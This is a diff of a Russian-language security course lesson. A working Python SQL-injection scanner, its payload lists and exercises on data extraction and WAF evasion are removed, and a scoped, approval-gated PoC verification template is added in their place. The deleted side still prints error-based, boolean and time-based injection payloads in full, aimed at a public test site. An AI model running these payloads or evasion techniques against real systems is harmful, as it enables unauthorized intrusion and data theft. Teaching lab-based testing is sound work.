@@ -1,388 +1,123 @@
-# Занятие 43: Написание PoC — скрипт проверки SQL-инъекции
+# Занятие 43: PoC как verification artifact
 
 ## Учебная рамка
 
-**Входные требования:** Минимальные навыки процедурного Python: переменные, функции, циклы, списки, словари, запуск `.py` из терминала.
+**Входные требования:** Завершен SDET Python QA Automation Apprenticeship или освоены pytest/API/UI/DB basics; студент умеет запускать Python из терминала и читать traceback.
 
-**Результат занятия:** Студент запускает или дорабатывает Python-скрипт, понимает поток выполнения и проверяет результат на безопасной цели.
+**Результат занятия:** шаблон PoC-отчета и guardrails без запуска payload по Slider AI.
 
-**Безопасная цель:** `127.0.0.1`, локальный тестовый HTTP-сервер, учебная VM `192.168.100.20` или заранее разрешенная лаборатория.
+**Наследуемая SDET-компетенция:** security automation engineering: тестируемый Python-код, allowlist, rate limit, structured output и review.
 
-**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.
+**Security QA-компетенция:** создание безопасных security QA helpers с отказом от опасных действий по умолчанию.
 
-**Обязательный путь новичка:** Запустить базовый скрипт, изменить один параметр, добавить один понятный вывод и проверить результат.
+**Связь с книгами:** «Легкий способ выучить Python 3 еще глубже» — CLI/файлы/текст; «Объектно-ориентированный Python» — классы и исключения; «Паттерны разработки на Python» — service boundaries; «Black Hat Python» — только lab-only идеи и defensive interpretation.
 
-**Углубление:** Добавить обработку ошибок, CLI-аргументы, сохранение результатов или ограничение скорости без усложнения основной логики.
+**Процессный артефакт:** `education/security_process/SECURITY_AUTOMATION_ARCHITECTURE.md`: helper, тесты, allowlist, output contract.
 
-**Минимальная проверка успеха:** Скрипт запускается без traceback, результат воспроизводим, студент может объяснить основные функции и входные данные.
+**Безопасная цель:** `127.0.0.1`, локальный тестовый HTTP-сервер, заранее подготовленный lab-файл или `https://olddev.slider-ai.ru` только в безопасном scope из `education/slider_ai_scope.md`.
 
-**Эталонный вывод:** В отчете есть команда запуска, фрагмент вывода, измененный параметр и короткое объяснение работы скрипта.
+**Среда выполнения:** macOS native, PyCharm/terminal, Python 3.12+, `.venv`, pytest. Kali/cloud lab используется только для lab-only техник, явно вынесенных в углубление.
 
-**Критерии сдачи:** Зачет: базовый запуск и небольшая доработка. Отлично: добавлена безопасная обработка ошибок и понятный README-фрагмент.
+**Обязательный путь новичка:** Реализовать минимальный безопасный helper, добавить отказ от небезопасного target/action и один pytest-тест этого отказа.
+
+**Углубление:** Добавить Pydantic/typed output, Markdown/JSON report, CI-like команду, code review checklist и интеграцию с process template.
+
+**Минимальная проверка успеха:** Helper запускается без traceback, опасное действие блокируется, output не содержит секретов, pytest-тесты проходят.
+
+**Эталонный вывод:** Команда запуска, один sanitized JSON/Markdown фрагмент, результат pytest и короткое объяснение safety guard.
+
+**Критерии сдачи:** Зачет: безопасный helper + тест отказа + artifact. Отлично: typed output, README, review checklist и automation appendix для отчета.
 
 ## Теория
 
-**PoC (Proof of Concept)** — это скрипт или метод, демонстрирующий возможность эксплуатации уязвимости. В пентесте PoC используется для подтверждения того, что уязвимость реальна и может быть использована злоумышленником.
+PoC для SDET — не “эксплойт ради эксплойта”, а контролируемый verification artifact. До запуска любого payload должны быть scope, owner approval, rollback/stop conditions и критерии доказательства.
 
-**SQL-инъекция** — это уязвимость, позволяющая внедрить произвольный SQL-код в запрос к базе данных. Она возникает при некорректной обработке пользовательского ввода.
+Security automation в этом курсе наследует SDET-подход:
 
-**Типы SQL-инъекций:**
-- **Classic (In-band):** результаты видны сразу в ответе
-- **Blind (Слепая):** результаты не видны напрямую, нужно анализировать косвенные признаки
-- **Time-based:** основана на задержках в ответе БД
-- **Out-of-band:** использует внешние каналы (DNS, HTTP)
-
-**Библиотеки:**
-- `requests` — для отправки HTTP-запросов
-- `re` — для парсинга ответов (регулярные выражения)
-- `time` — для time-based проверок
-
-**Установка (macOS M2 - pip3):**
-```bash
-pip3 install requests
-```
-
-> **Примечание:** На macOS с Apple Silicon используйте `pip3` вместо `pip`, так как `pip` часто указывает на системный Python 2.7.
+1. Сначала определяется риск и scope.
+2. Затем пишется минимальный helper с безопасными дефолтами.
+3. Опасное поведение блокируется тестами.
+4. Output становится evidence, а не “сырым логом”.
+5. Tool output не является finding без ручной валидации.
 
 ## Практическое занятие
 
-Напишем PoC для проверки SQL-инъекции в параметре ID (GET-запрос).
+```markdown
+# PoC Verification Plan
 
-```python
-import requests
-import time
-import re
-from urllib.parse import urljoin
+## Hypothesis
 
-class SQLiChecker:
-    """Класс для проверки SQL-инъекций"""
-    
-    def __init__(self, target_url, params=None):
-        """
-        Инициализация
-        :param target_url: целевой URL
-        :param params: словарь параметров (например, {'id': '1'})
-        """
-        self.target_url = target_url
-        self.params = params or {}
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        self.vulnerable = False
-        self.evidence = []
-    
-    def check_error_based(self, param_name, payloads=None):
-        """
-        Проверка на error-based SQL-инъекцию
-        :param param_name: имя параметра для проверки
-        :param payloads: список пейлоадов (если None, используются стандартные)
-        """
-        if payloads is None:
-            payloads = [
-                "'",
-                '"',
-                "' OR '1'='1",
-                '" OR "1"="1',
-                "' OR 1=1--",
-                '" OR 1=1--',
-                "1' AND 1=1--",
-                "1' AND 1=2--",
-                "' UNION SELECT NULL--",
-                "' UNION SELECT NULL,NULL--",
-                "' UNION SELECT NULL,NULL,NULL--",
-            ]
-        
-        print(f"\n[+] Проверка error-based SQL-инъекции в параметре '{param_name}'...")
-        
-        # Сначала получаем базовый ответ (без инъекции)
-        try:
-            base_response = self.session.get(self.target_url, params=self.params, timeout=10)
-            base_content = base_response.text
-            base_length = len(base_content)
-        except Exception as e:
-            print(f"[-] Ошибка получения базового ответа: {e}")
-            return False
-        
-        # Регулярные выражения для поиска ошибок БД
-        error_patterns = [
-            r"SQL syntax.*MySQL",
-            r"Warning.*mysql_.*",
-            r"MySQLSyntaxErrorException",
-            r"valid MySQL result",
-            r"PostgreSQL.*ERROR",
-            r"Warning.*pg_.*",
-            r"PG::SyntaxError",
-            r"SQLite/JDBCDriver",
-            r"SQLite\.Exception",
-            r"System\.Data\.SQLite\.SQLiteException",
-            r"ORA-[0-9]{5}",
-            r"Microsoft SQL Server",
-            r"ODBC SQL Server Driver",
-            r"SQLServer JDBC Driver",
-            r"Unclosed quotation mark after the character string",
-            r"you have an error in your SQL syntax",
-        ]
-        
-        for payload in payloads:
-            test_params = self.params.copy()
-            test_params[param_name] = payload
-            
-            try:
-                response = self.session.get(self.target_url, params=test_params, timeout=10)
-                content = response.text
-                
-                # Проверяем на наличие ошибок БД в ответе
-                for pattern in error_patterns:
-                    if re.search(pattern, content, re.IGNORECASE):
-                        print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ!")
-                        print(f"         Пейлоад: {payload}")
-                        print(f"         Паттерн: {pattern}")
-                        self.vulnerable = True
-                        self.evidence.append({
-                            'type': 'error-based',
-                            'param': param_name,
-                            'payload': payload,
-                            'pattern': pattern
-                        })
-                        return True
-                
-                # Проверяем разницу в длине ответа (индикатор изменения поведения)
-                if abs(len(content) - base_length) > 100:
-                    print(f"    [+] Подозрительное изменение длины ответа при пейлоаде: {payload}")
-                    print(f"         Базовая длина: {base_length}, текущая: {len(content)}")
-                
-            except Exception as e:
-                print(f"    [-] Ошибка при проверке пейлоада '{payload}': {e}")
-        
-        print(f"    [-] Error-based SQL-инъекция не обнаружена")
-        return False
-    
-    def check_boolean_based(self, param_name):
-        """
-        Проверка на boolean-based blind SQL-инъекцию
-        :param param_name: имя параметра
-        """
-        print(f"\n[+] Проверка boolean-based blind SQL-инъекции в параметре '{param_name}'...")
-        
-        # Тестовые пары: (условие истина, условие ложь)
-        test_pairs = [
-            ("1 AND 1=1", "1 AND 1=2"),
-            ("' AND 1=1--", "' AND 1=2--"),
-            ('" AND 1=1--', '" AND 1=2--'),
-            ("1' AND '1'='1", "1' AND '1'='2"),
-        ]
-        
-        for true_cond, false_cond in test_pairs:
-            test_params_true = self.params.copy()
-            test_params_true[param_name] = true_cond
-            
-            test_params_false = self.params.copy()
-            test_params_false[param_name] = false_cond
-            
-            try:
-                resp_true = self.session.get(self.target_url, params=test_params_true, timeout=10)
-                resp_false = self.session.get(self.target_url, params=test_params_false, timeout=10)
-                
-                # Сравниваем ответы
-                if resp_true.status_code != resp_false.status_code:
-                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (разница в кодах ответа)!")
-                    print(f"         True: {true_cond} -> {resp_true.status_code}")
-                    print(f"         False: {false_cond} -> {resp_false.status_code}")
-                    self.vulnerable = True
-                    self.evidence.append({
-                        'type': 'boolean-based',
-                        'param': param_name,
-                        'true_payload': true_cond,
-                        'false_payload': false_cond
-                    })
-                    return True
-                
-                if abs(len(resp_true.text) - len(resp_false.text)) > 50:
-                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (разница в длине ответа)!")
-                    print(f"         True: {true_cond} -> длина {len(resp_true.text)}")
-                    print(f"         False: {false_cond} -> длина {len(resp_false.text)}")
-                    self.vulnerable = True
-                    return True
-                
-            except Exception as e:
-                print(f"    [-] Ошибка: {e}")
-        
-        print(f"    [-] Boolean-based SQL-инъекция не обнаружена")
-        return False
-    
-    def check_time_based(self, param_name, delay=5):
-        """
-        Проверка на time-based blind SQL-инъекцию
-        :param param_name: имя параметра
-        :param delay: ожидаемая задержка в секундах
-        """
-        print(f"\n[+] Проверка time-based blind SQL-инъекции в параметре '{param_name}'...")
-        
-        time_payloads = [
-            f"1 AND SLEEP({delay})",
-            f"1' AND SLEEP({delay})--",
-            f"' AND SLEEP({delay})--",
-            f"1;WAITFOR DELAY '0:0:{delay}'",
-            f"1' AND BENCHMARK(5000000,MD5('test'))--",
-        ]
-        
-        for payload in time_payloads:
-            test_params = self.params.copy()
-            test_params[param_name] = payload
-            
-            try:
-                start_time = time.time()
-                response = self.session.get(self.target_url, params=test_params, timeout=delay+10)
-                elapsed = time.time() - start_time
-                
-                if elapsed >= delay:
-                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (задержка {elapsed:.2f} сек)!")
-                    print(f"         Пейлоад: {payload}")
-                    self.vulnerable = True
-                    self.evidence.append({
-                        'type': 'time-based',
-                        'param': param_name,
-                        'payload': payload,
-                        'delay': elapsed
-                    })
-                    return True
-                else:
-                    print(f"    [+] Пейлоад: {payload} -> задержка {elapsed:.2f} сек (норма)")
-                
-            except requests.exceptions.Timeout:
-                print(f"    [+] Пейлоад: {payload} -> таймаут (возможно, уязвимость)")
-            except Exception as e:
-                print(f"    [-] Ошибка: {e}")
-        
-        print(f"    [-] Time-based SQL-инъекция не обнаружена")
-        return False
-    
-    def run_all_checks(self, param_name):
-        """Запуск всех проверок"""
-        print(f"\n{'='*60}")
-        print(f"Проверка SQL-инъекций для {self.target_url}")
-        print(f"Параметр: {param_name}")
-        print(f"{'='*60}")
-        
-        self.check_error_based(param_name)
-        if not self.vulnerable:
-            self.check_boolean_based(param_name)
-        if not self.vulnerable:
-            self.check_time_based(param_name)
-        
-        print(f"\n{'='*60}")
-        if self.vulnerable:
-            print("РЕЗУЛЬТАТ: Обнаружена SQL-инъекция!")
-            print("Детали:")
-            for ev in self.evidence:
-                print(f"  - Тип: {ev['type']}")
-                print(f"    Параметр: {ev['param']}")
-        else:
-            print("РЕЗУЛЬТАТ: SQL-инъекция не обнаружена")
-        print(f"{'='*60}\n")
+## Scope / approval
 
-if __name__ == "__main__":
-    # Пример использования (тестовый сайт с уязвимостью)
-    # В реальном пентесте используйте только на разрешенных целях!
-    
-    # Для тестирования можно использовать:
-    # - http://testphp.vulnweb.com/ (легальный тестовый сайт)
-    # - Свою локальную уязвимую лабораторию
-    
-    target = "http://testphp.vulnweb.com/artists.php"
-    params = {"artist": "1"}
-    
-    checker = SQLiChecker(target, params)
-    checker.run_all_checks("artist")
+## Safe input or lab payload
+
+## Expected evidence
+
+## Stop conditions
+
+## Why this is not executed on Slider AI now
 ```
 
-**Объяснение кода:**
-1. Класс `SQLiChecker` инкапсулирует всю логику проверки
-2. `check_error_based()` — ищет ошибки БД в ответе (самый очевидный тип)
-3. `check_boolean_based()` — сравнивает ответы при истинном и ложном условиях
-4. `check_time_based()` — измеряет время ответа при использовании функций задержки
-5. Используются регулярные выражения для поиска типичных ошибок БД
+Для продукта обязательный минимум — описать гипотезу, безопасный маркер, expected control и статус `requires approval`, если нужна активная проверка.
 
-**Важно:** Запускайте только на системах, на которые у вас есть разрешение!
+
+### Минимальная структура сдачи
+
+```text
+security_qa_helper/
+├── safeguards/
+├── reports/
+├── tests/
+└── README.md
+```
+
+### Команды проверки
+
+```bash
+python -m pytest tests/
+python -m security_qa_helper --help
+```
 
 ## Примеры вывода
 
-Пример успешного обнаружения SQL-инъекции:
+```text
+$ pytest tests/test_safeguards.py
+1 passed in 0.05s
 
+$ python -m security_qa_helper --target https://olddev.slider-ai.ru --dry-run
+{"target":"https://olddev.slider-ai.ru","dry_run":true,"secrets_masked":true,"status":"observation"}
 ```
-============================================================
-Проверка SQL-инъекций для http://testphp.vulnweb.com/artists.php
-Параметр: artist
-============================================================
-
-[+] Проверка error-based SQL-инъекции в параметре 'artist'...
-    [!!!] НАЙДЕНА УЯЗВИМОСТЬ!
-         Пейлоад: ' OR 1=1--
-         Паттерн: you have an error in your SQL syntax
-
-============================================================
-РЕЗУЛЬТАТ: Обнаружена SQL-инъекция!
-Детали:
-  - Тип: error-based
-    Параметр: artist
-============================================================
-```
-
-## Частые ошибки
-
-1. **`NameError: name 'urllib3' is not defined`** — В файле lesson_42 уже исправлен импорт, но если переносите код, убедитесь, что добавили `import urllib3`.
-2. **Ложноположительные срабатывания** — Некоторые пейлоады могут вызывать ошибки, не связанные с SQL-инъекцией. Всегда проверяйте несколько раз и анализируйте контекст.
-3. **WAF блокировка** — Современные WAF могут блокировать запросы с подозрительными параметрами. Используйте обфускацию и ротацию User-Agent.
-4. **`requests.exceptions.Timeout`** — При проверке time-based инъекций увеличьте таймаут, так как некоторые запросы могут выполняться долго.
-
-## Вопросы на понимание
-
-1. **В чем разница между error-based и blind SQL-инъекцией?**
-   <details>
-   <summary>Ответ</summary>
-   Error-based возвращает явную ошибку БД в ответе, которую можно увидеть сразу. Blind (слепая) инъекция не возвращает данные напрямую, и нужно анализировать косвенные признаки (время ответа, изменение содержимого).
-   </details>
-
-2. **Зачем нужны три разных метода проверки (error, boolean, time)?**
-   <details>
-   <summary>Ответ</summary>
-   Разные цели могут быть уязвимы только к определенным типам инъекций. Error-based самый быстрый, но его легко заметить. Boolean-based сложнее обнаружить. Time-based работает даже когда нет видимого результата, но медленнее всех.
-   </details>
-
-3. **Почему в коде используется `session` вместо простого `requests.get()`?**
-   <details>
-   <summary>Ответ</summary>
-   Session сохраняет куки и заголовки между запросами. Это важно, если цель требует предварительной авторизации или использует сессии для отслеживания state.
-   </details>
-
-## Задачи для самостоятельного выполнения
-
-1. **POST-запросы:** Расширьте класс для проверки SQL-инъекций в POST-параметрах (не только GET).
-
-2. **Cookie и заголовки:** Добавьте возможность проверки инъекций в куки и HTTP-заголовках (User-Agent, Referer и т.д.).
-
-3. **Автоматическое определение БД:** Добавьте логику определения типа базы данных (MySQL, PostgreSQL, MSSQL, SQLite) на основе ошибок и специфичных для БД пейлоадов.
-
-4. **Извлечение данных:** Напишите функцию, которая после обнаружения уязвимости пытается извлечь версию БД или имя текущей базы данных.
-
-5. **WAF обход:** Добавьте варианты пейлоадов для обхода WAF (Web Application Firewall):
-   - Использование комментариев: `/**/`
-   - Обфускация ключевых слов: `SeLeCt`, `UnIoN`
-   - Использование альтернативных кодировок
-
-6. **Отчет:** Создайте метод `generate_report()`, который сохраняет результаты проверки в JSON-файл с подробным описанием уязвимости.
-
-7. **Интеграция с sqlmap:** Добавьте возможность запуска sqlmap через subprocess для подтверждения и глубокого исследования найденной уязвимости.
 
 ## Адаптация под macOS (M2, 8GB)
 
-При выполнении заданий на компьютере Mac с процессором M2 и 8GB оперативной памяти учитывайте следующие особенности:
+- Используйте `.venv` и PyCharm interpreter из SDET-курса.
+- Устанавливайте зависимости через `python -m pip install ...` внутри venv.
+- Не запускайте тяжелые scan/wordlist процессы локально без необходимости.
+- Для lab-only техник используйте cloud lab или легкую ARM64 VM.
 
-- Для установки библиотек используйте `pip3 install <package>`, а не `pip install`.
-- На M2 можно использовать `asyncio`, он поддерживает ARM.
-- На 8GB RAM проект может быть тяжелым, используйте легковесные библиотеки.
-- Для работы с aiohttp в будущих уроках используйте `connector = aiohttp.TCPConnector(ssl=False)` вместо передачи `ssl=False` напрямую в `get()`.
+## Частые ошибки
+
+1. Писать script, который по умолчанию атакует любой target.
+2. Не тестировать safety guard.
+3. Сохранять cookies/tokens в output.
+4. Называть candidate finding подтвержденной уязвимостью.
+5. Подменять security process “интересной техникой”.
+
+## Вопросы на понимание
+
+1. Какой SDET-навык переносится в этот helper?
+2. Какой unsafe action должен быть заблокирован тестом?
+3. Почему output инструмента не равен finding?
+4. Какие поля нужны в sanitized evidence?
+5. Как этот helper будет использоваться в retest?
+
+## Задачи для самостоятельного выполнения
+
+1. Добавьте pytest-тест на отказ от target вне allowlist.
+2. Добавьте README-раздел `Scope and stop conditions`.
+3. Сохраните output в Markdown или JSON.
+4. Проведите self-review по `TOOLING_POLICY.md`.
+5. Опишите, как helper попадет в финальный отчет как automation appendix.
 
 ## Практика на Slider AI
 
@@ -392,19 +127,19 @@ if __name__ == "__main__":
 
 **Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.
 
-**Уровень прогрессии:** PoC ethics
+**Уровень прогрессии:** PoC governance
 
 ### Минимум
 
-Не запускайте SQLi/XSS PoC по Slider AI; создайте безопасный шаблон PoC-отчета.
+Покажите safety guard: helper должен отказаться от действия, если target/action не входит в безопасный scope.
 
 ### Практика Slider AI
 
-Опишите, какие условия должны быть выполнены перед запуском PoC на стенде.
+Не запускайте SQLi/XSS PoC по Slider AI; заполните PoC Verification Plan и отметьте `requires approval`.
 
 ### Углубление после изучения следующих уроков
 
-После finding и разрешения заполните шаблон реальными sanitized доказательствами.
+Добавьте результат в `education/security_process/SECURITY_AUTOMATION_ARCHITECTURE.md` или в свой локальный automation appendix: что проверяется, какие ограничения стоят, какой output попадает в отчет.
 
 ### Артефакт сдачи
 
